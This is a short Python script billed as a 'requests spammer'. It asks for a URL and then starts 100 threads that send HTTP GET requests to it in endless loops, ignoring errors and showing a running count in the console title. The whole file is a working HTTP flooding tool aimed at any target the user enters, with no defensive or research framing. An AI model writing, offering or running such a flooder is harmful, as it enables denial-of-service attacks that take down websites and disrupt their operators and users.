# ---- Import stuff here ----
import requests
import os
from colorama import Fore
import threading

ascii = """
          _       _       _                                  _                                                       
         | |     | |     | |                                | |                                                      
 __  ____| | __ _| | ____| |  _ __ ___  __ _ _   _  ___  ___| |_ ___   ___ _ __   __ _ _ __ ___  _ __ ___   ___ _ __ 
 \ \/ / _` |/ _` | |/ / _` | | '__/ _ \/ _` | | | |/ _ \/ __| __/ __| / __| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
  >  < (_| | (_| |   < (_| | | | |  __/ (_| | |_| |  __/\__ \ |_\__ \ \__ \ |_) | (_| | | | | | | | | | | |  __/ |   
 /_/\_\__,_|\__, |_|\_\__,_| |_|  \___|\__, |\__,_|\___||___/\__|___/ |___/ .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|   
             __/ |                        | |                             | |                                        
            |___/                         |_|                             |_|                                        """

# ---- Startup ----

os.system("cls")
os.system("title xdgkd requests spammer")

print(f"{Fore.BLUE}{ascii}")
print(" ")
print(" ")


counter = 0

link = input("Input link u want to spam here: ")

os.system("cls")

print(f"{Fore.BLUE}{ascii}")
print(" ")
print(" ")

# ---- Main part ----

def mainfunchtion():
    global counter
    while True:
        try:
            requests.get(f"{link}")
            counter += 1
            print(f"Request sent: {counter}")
        except Exception as e:
            pass
        
def title():
    global counter
    while True: os.system(f"title Requests: [{counter}]")
thread = threading.Thread(target=title)
thread.start()

def start():
    for i in range(100):
        try:
            threading.Thread(target=mainfunchtion, args=(), daemon=True).start()
        except Exception as e:
                print(e)
                pass

if __name__ == "__main__":
    start()